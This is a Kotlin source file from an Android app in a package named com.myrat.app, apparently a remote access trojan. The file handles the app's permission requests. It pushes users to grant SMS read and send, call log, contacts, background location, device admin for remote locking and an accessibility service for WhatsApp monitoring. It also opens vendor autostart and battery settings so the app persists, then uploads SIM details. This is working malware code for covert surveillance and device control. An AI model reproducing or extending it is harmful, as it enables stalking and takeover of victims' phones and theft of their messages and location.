package com.myrat.app.handler

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import com.myrat.app.utils.Logger
import pub.devrel.easypermissions.EasyPermissions
import pub.devrel.easypermissions.PermissionRequest
import java.lang.ref.WeakReference

class PermissionHandler(
    activity: Activity,
    private val simDetailsHandler: SimDetailsHandler
) {
    
    private val activityRef = WeakReference(activity)
    private var currentStep = 0
    private val totalSteps = 10
    private var permissionsRequested = false
    
    companion object {
        private const val RC_SMS_PERMISSIONS = 100
        private const val RC_PHONE_PERMISSIONS = 101
        private const val RC_LOCATION_PERMISSIONS = 102
        private const val RC_STORAGE_PERMISSIONS = 103
        private const val RC_BACKGROUND_LOCATION = 104
        private const val RC_NOTIFICATION_PERMISSIONS = 105
        private const val RC_ALL_PERMISSIONS = 106
    }
    
    // All critical permissions in one array for easier management
    private val allCriticalPermissions = mutableListOf<String>().apply {
        // SMS permissions (CRITICAL)
        addAll(listOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS
        ))
        
        // Phone permissions (CRITICAL)
        addAll(listOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG
        ))
        
        // Location permissions (CRITICAL)
        addAll(listOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ))
        
        // Storage permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        
        // Background location (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
    }.toTypedArray()

    fun requestPermissions() {
        val activity = activityRef.get() ?: return
        
        if (permissionsRequested) {
            Logger.log("Permissions already requested, skipping")
            return
        }
        
        Logger.log("Starting COMPREHENSIVE permission flow for ALL features")
        currentStep = 1
        permissionsRequested = true
        
        // Request ALL critical permissions at once for better user experience
        requestAllCriticalPermissions(activity)
    }

    private fun requestAllCriticalPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting ALL critical permissions at once")
        
        try {
            val missingPermissions = allCriticalPermissions.filter { 
                !EasyPermissions.hasPermissions(activity, it) 
            }
            
            if (missingPermissions.isEmpty()) {
                Logger.log("All critical permissions already granted")
                currentStep++
                requestSpecialPermissions(activity)
                return
            }
            
            Logger.log("Missing permissions: $missingPermissions")
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_ALL_PERMISSIONS, *missingPermissions.toTypedArray())
                    .setRationale("""
                        This app requires ALL of these permissions to function properly:
                        
                        📱 SMS Permissions - CRITICAL for receiving, reading, and sending SMS
                        📞 Phone Permissions - CRITICAL for calls, contacts, and phone state
                        📍 Location Permissions - CRITICAL for location tracking and monitoring
                        📁 Storage Permissions - For accessing images and files
                        🔔 Notification Permissions - For important alerts and status updates
                        
                        Please grant ALL permissions for the app to work correctly.
                    """.trimIndent())
                    .setPositiveButtonText("Grant All")
                    .setNegativeButtonText("Deny")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting all critical permissions", e)
            currentStep++
            requestSpecialPermissions(activity)
        }
    }

    private fun requestSpecialPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting special permissions")
        
        try {
            // Battery optimization (CRITICAL for service persistence)
            if (!isBatteryOptimizationDisabled(activity)) {
                requestBatteryOptimization(activity)
                return
            }
            
            currentStep++
            requestSystemPermissions(activity)
        } catch (e: Exception) {
            Logger.error("Error requesting special permissions", e)
            currentStep++
            requestSystemPermissions(activity)
        }
    }

    private fun requestSystemPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting system permissions")
        
        try {
            // System alert window (for overlay functionality)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
                requestOverlayPermission(activity)
                return
            }
            
            currentStep++
            requestDeviceAdminPermissions(activity)
        } catch (e: Exception) {
            Logger.error("Error requesting system permissions", e)
            currentStep++
            requestDeviceAdminPermissions(activity)
        }
    }

    private fun requestDeviceAdminPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting device admin and accessibility")
        
        try {
            // Device admin (for lock/unlock functionality)
            if (!isDeviceAdminEnabled(activity)) {
                requestDeviceAdmin(activity)
                return
            }
            
            // Accessibility service (for WhatsApp monitoring)
            if (!isAccessibilityServiceEnabled(activity)) {
                requestAccessibilityService(activity)
                return
            }
            
            // Exact alarms (Android 12+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                if (!alarmManager.canScheduleExactAlarms()) {
                    requestExactAlarms(activity)
                    return
                }
            }
            
            currentStep++
            requestManufacturerSpecificSettings(activity)
        } catch (e: Exception) {
            Logger.error("Error requesting device admin permissions", e)
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    // Callback methods for MainActivity to call
    fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
        val activity = activityRef.get() ?: return
        
        Logger.log("Permissions granted for request $requestCode: $perms")
        
        try {
            when (requestCode) {
                RC_ALL_PERMISSIONS -> {
                    Logger.log("All critical permissions granted, proceeding to special permissions")
                    currentStep++
                    requestSpecialPermissions(activity)
                }
                else -> {
                    // Continue with next step
                    currentStep++
                    requestSpecialPermissions(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsGranted", e)
        }
    }

    fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
        val activity = activityRef.get() ?: return
        
        Logger.warn("Permissions denied for request $requestCode: $perms")
        
        try {
            // Check if some permissions are permanently denied
            if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
                Logger.warn("Some permissions permanently denied: $perms")
                // Show settings dialog for permanently denied permissions
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:${activity.packageName}")
                    }
                    activity.startActivity(intent)
                } catch (e: Exception) {
                    Logger.error("Failed to open app settings for permanently denied permissions", e)
                }
            }
            
            // Continue with next step regardless of denials
            currentStep++
            requestSpecialPermissions(activity)
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsDenied", e)
        }
    }

    private fun requestBatteryOptimization(activity: Activity) {
        Logger.log("Requesting battery optimization disable (CRITICAL)")
        
        try {
            if (isBatteryOptimizationDisabled(activity)) {
                currentStep++
                requestSystemPermissions(activity)
                return
            }
            
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Battery optimization intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestSystemPermissions(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request battery optimization", e)
            currentStep++
            requestSystemPermissions(activity)
        }
    }

    private fun requestOverlayPermission(activity: Activity) {
        Logger.log("Requesting overlay permission")
        
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(activity)) {
                currentStep++
                requestDeviceAdminPermissions(activity)
                return
            }
            
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Overlay permission intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestDeviceAdminPermissions(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request overlay permission", e)
            currentStep++
            requestDeviceAdminPermissions(activity)
        }
    }

    private fun requestDeviceAdmin(activity: Activity) {
        Logger.log("Requesting device admin (for lock/unlock)")
        
        try {
            if (isDeviceAdminEnabled(activity)) {
                // Check accessibility next
                if (!isAccessibilityServiceEnabled(activity)) {
                    requestAccessibilityService(activity)
                    return
                }
                
                // Check exact alarms
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                    if (!alarmManager.canScheduleExactAlarms()) {
                        requestExactAlarms(activity)
                        return
                    }
                }
                
                currentStep++
                requestManufacturerSpecificSettings(activity)
                return
            }
            
            val adminComponent = ComponentName(activity, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Device Administrator permission is required for:\n• Remote device locking/unlocking\n• Security management\n• Device control features")
            }
            activity.startActivity(intent)
            Logger.log("Device admin intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                // Check accessibility next
                if (!isAccessibilityServiceEnabled(activity)) {
                    requestAccessibilityService(activity)
                } else {
                    // Check exact alarms
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                        if (!alarmManager.canScheduleExactAlarms()) {
                            requestExactAlarms(activity)
                        } else {
                            currentStep++
                            requestManufacturerSpecificSettings(activity)
                        }
                    } else {
                        currentStep++
                        requestManufacturerSpecificSettings(activity)
                    }
                }
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request device admin", e)
            // Continue with accessibility
            if (!isAccessibilityServiceEnabled(activity)) {
                requestAccessibilityService(activity)
            } else {
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }
        }
    }

    private fun requestAccessibilityService(activity: Activity) {
        Logger.log("Requesting accessibility service (for WhatsApp monitoring)")
        
        try {
            if (isAccessibilityServiceEnabled(activity)) {
                // Check exact alarms
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                    if (!alarmManager.canScheduleExactAlarms()) {
                        requestExactAlarms(activity)
                        return
                    }
                }
                
                currentStep++
                requestManufacturerSpecificSettings(activity)
                return
            }
            
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            activity.startActivity(intent)
            Logger.log("Accessibility settings intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                // Check exact alarms
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                    if (!alarmManager.canScheduleExactAlarms()) {
                        requestExactAlarms(activity)
                    } else {
                        currentStep++
                        requestManufacturerSpecificSettings(activity)
                    }
                } else {
                    currentStep++
                    requestManufacturerSpecificSettings(activity)
                }
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to open accessibility settings", e)
            // Check exact alarms
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                if (!alarmManager.canScheduleExactAlarms()) {
                    requestExactAlarms(activity)
                } else {
                    currentStep++
                    requestManufacturerSpecificSettings(activity)
                }
            } else {
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }
        }
    }

    private fun requestExactAlarms(activity: Activity) {
        Logger.log("Requesting exact alarms permission (Android 12+)")
        
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                currentStep++
                requestManufacturerSpecificSettings(activity)
                return
            }
            
            val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            if (alarmManager.canScheduleExactAlarms()) {
                currentStep++
                requestManufacturerSpecificSettings(activity)
                return
            }
            
            val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Exact alarms permission intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request exact alarms permission", e)
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    private fun requestManufacturerSpecificSettings(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Opening manufacturer-specific settings (MIUI, ColorOS, etc.)")
        
        try {
            val manufacturer = Build.MANUFACTURER.lowercase()
            Logger.log("Device manufacturer: $manufacturer")
            
            when {
                manufacturer.contains("xiaomi") -> openXiaomiSettings(activity)
                manufacturer.contains("oppo") -> openOppoSettings(activity)
                manufacturer.contains("vivo") -> openVivoSettings(activity)
                manufacturer.contains("huawei") -> openHuaweiSettings(activity)
                manufacturer.contains("samsung") -> openSamsungSettings(activity)
                manufacturer.contains("oneplus") -> openOnePlusSettings(activity)
                manufacturer.contains("realme") -> openRealmeSettings(activity)
                else -> {
                    Logger.log("No specific manufacturer settings for: $manufacturer")
                    finishPermissionFlow(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Failed to open manufacturer settings", e)
            finishPermissionFlow(activity)
        }
    }

    private fun openXiaomiSettings(activity: Activity) {
        Logger.log("Opening MIUI-specific settings (CRITICAL for MIUI devices)")
        
        val intents = listOf(
            // Autostart management (CRITICAL)
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            // Battery optimization (CRITICAL)
            Intent().setComponent(ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")),
            // App permissions (CRITICAL)
            Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName),
            // Security center
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.securitycenter.Main")),
            // Power settings
            Intent().setComponent(ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")),
            // Background app management
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.permissions.AppPermissionsEditorActivity")),
            // MIUI optimization
            Intent().setComponent(ComponentName("com.android.settings", "com.android.settings.Settings\$DevelopmentSettingsActivity"))
        )
        
        tryLaunchIntents(activity, intents, "MIUI Security and Power settings (CRITICAL)")
    }

    private fun openOppoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")),
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.MainActivity")),
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.PermissionManagerActivity"))
        )
        
        tryLaunchIntents(activity, intents, "ColorOS Phone Manager (CRITICAL)")
    }

    private fun openVivoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.PurviewTabActivity")),
            Intent().setComponent(ComponentName("com.vivo.abe", "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity"))
        )
        
        tryLaunchIntents(activity, intents, "Vivo iManager (CRITICAL)")
    }

    private fun openHuaweiSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.MainActivity"))
        )
        
        tryLaunchIntents(activity, intents, "Huawei Phone Manager (CRITICAL)")
    }

    private fun openSamsungSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            Intent().setComponent(ComponentName("com.samsung.android.sm_cn", "com.samsung.android.sm.ui.ram.AutoRunActivity")),
            Intent().setComponent(ComponentName("com.samsung.android.sm", "com.samsung.android.sm.ui.ram.AutoRunActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        
        tryLaunchIntents(activity, intents, "Samsung Device Care")
    }

    private fun openOnePlusSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")),
            Intent().setComponent(ComponentName("com.android.settings", "com.android.settings.Settings\$HighPowerApplicationsActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        
        tryLaunchIntents(activity, intents, "OnePlus Security")
    }

    private fun openRealmeSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent().setComponent(ComponentName("com.realme.rmm", "com.realme.rmm.ui.StartupAppListActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        
        tryLaunchIntents(activity, intents, "Realme Phone Manager")
    }

    private fun tryLaunchIntents(activity: Activity, intents: List<Intent>, settingsName: String) {
        for (intent in intents) {
            try {
                if (intent.resolveActivity(activity.packageManager) != null) {
                    activity.startActivity(intent)
                    Logger.log("Successfully opened $settingsName")
                    
                    // Finish after delay
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        finishPermissionFlow(activity)
                    }, 2000)
                    return
                }
            } catch (e: Exception) {
                Logger.warn("Failed to launch intent for $settingsName: ${e.message}")
            }
        }
        
        // Fallback to app settings
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Opened app settings as fallback for $settingsName")
        } catch (e: Exception) {
            Logger.error("Failed to open app settings fallback", e)
        }
        
        finishPermissionFlow(activity)
    }

    private fun finishPermissionFlow(activity: Activity) {
        Logger.log("Permission flow completed - all permissions requested")
        
        try {
            // Upload SIM details after permissions are granted
            simDetailsHandler.uploadSimDetails()
        } catch (e: Exception) {
            Logger.error("Failed to upload SIM details", e)
        }
    }

    // Helper methods for checking permission states
    private fun isBatteryOptimizationDisabled(context: Context): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                powerManager.isIgnoringBatteryOptimizations(context.packageName)
            } else {
                true
            }
        } catch (e: Exception) {
            Logger.error("Error checking battery optimization", e)
            false
        }
    }

    private fun isDeviceAdminEnabled(context: Context): Boolean {
        return try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            devicePolicyManager.isAdminActive(adminComponent)
        } catch (e: Exception) {
            Logger.error("Error checking device admin", e)
            false
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val services = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                services?.contains("${context.packageName}/com.myrat.app.service.WhatsAppService") == true
            } else {
                false
            }
        } catch (e: Exception) {
            Logger.error("Error checking accessibility service", e)
            false
        }
    }

    fun hasBasicPermissions(): Boolean {
        val activity = activityRef.get() ?: return false
        
        try {
            // Check if at least SMS and phone permissions are granted
            val basicPermissions = arrayOf(
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CALL_PHONE
            )
            
            return EasyPermissions.hasPermissions(activity, *basicPermissions)
        } catch (e: Exception) {
            Logger.error("Error checking basic permissions", e)
            return false
        }
    }

    fun areAllPermissionsGranted(): Boolean {
        val activity = activityRef.get() ?: return false
        
        try {
            // Check runtime permissions using EasyPermissions
            val runtimeGranted = EasyPermissions.hasPermissions(activity, *allCriticalPermissions)
            
            // Check special permissions
            val batteryOptimized = isBatteryOptimizationDisabled(activity)
            val overlayGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.canDrawOverlays(activity)
            } else {
                true
            }
            val deviceAdminGranted = isDeviceAdminEnabled(activity)
            val accessibilityGranted = isAccessibilityServiceEnabled(activity)
            
            val exactAlarmsGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                alarmManager.canScheduleExactAlarms()
            } else {
                true
            }
            
            Logger.log("Permission status - Runtime: $runtimeGranted, Battery: $batteryOptimized, Overlay: $overlayGranted, DeviceAdmin: $deviceAdminGranted, Accessibility: $accessibilityGranted, ExactAlarms: $exactAlarmsGranted")
            
            // Return true if at least core permissions are granted (SMS, Phone, Location) and battery optimization is disabled
            return runtimeGranted && batteryOptimized
        } catch (e: Exception) {
            Logger.error("Error checking permissions", e)
            return false
        }
    }

    fun handleResume() {
        try {
            // Check if all permissions are granted when activity resumes
            val activity = activityRef.get() ?: return
            
            if (areAllPermissionsGranted()) {
                Logger.log("All permissions granted on resume")
                finishPermissionFlow(activity)
            }
        } catch (e: Exception) {
            Logger.error("Error in handleResume", e)
        }
    }

    fun cleanup() {
        try {
            // Clean up any resources
            Logger.log("PermissionHandler cleanup completed")
        } catch (e: Exception) {
            Logger.error("Error in cleanup", e)
        }
    }
}